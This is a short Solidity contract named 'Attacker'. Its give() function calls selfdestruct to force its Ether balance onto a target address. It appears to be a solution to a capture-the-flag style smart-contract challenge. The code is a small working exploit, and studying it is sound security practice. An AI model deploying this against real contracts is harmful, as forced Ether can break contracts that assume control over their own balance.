// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract Attacker{
    address payable force;

    constructor(address payable _force) payable {
        force = _force;
    }

    function give() public payable{
        selfdestruct(force);
    }
    
}